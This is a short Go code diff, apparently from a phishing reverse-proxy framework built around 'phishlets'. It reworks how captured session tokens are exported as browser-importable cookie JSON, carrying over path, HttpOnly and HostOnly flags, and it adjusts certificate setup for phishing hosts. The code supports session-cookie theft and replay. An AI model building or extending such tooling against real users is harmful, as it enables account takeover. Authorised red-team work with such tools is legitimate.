@@ -474,7 +474,7 @@ func (t *Terminal) createHelp() {
 	t.hlp = h
 }
 
-func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]string) string {
+func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
 	type Cookie struct {
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
@@ -482,20 +482,25 @@ func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]strin
 		Value          string `json:"value"`
 		Name           string `json:"name"`
 		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
 	}
 
 	var cookies []*Cookie
 	for domain, tmap := range tokens {
 		for k, v := range tmap {
 			c := &Cookie{
-				Path:           "/",
+				Path:           v.Path,
 				Domain:         domain,
 				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
-				Value:          v,
+				Value:          v.Value,
 				Name:           k,
+				HttpOnly:       v.HttpOnly,
 			}
-			if pl.isTokenHttpOnly(domain, k) {
-				c.HttpOnly = true
+			if domain[:1] != "." {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
 			}
 			cookies = append(cookies, c)
 		}
@@ -524,7 +529,6 @@ func (t *Terminal) updateCertificates(site string) {
 			}
 			if t.developer {
 				log.Info("developer mode is on - will use self-signed SSL/TLS certificates for phishlet '%s'", s)
-				return
 			} else {
 				log.Info("setting up certificates for phishlet '%s'...", s)
 				err = t.crt_db.SetupCertificate(s, pl.GetPhishHosts())
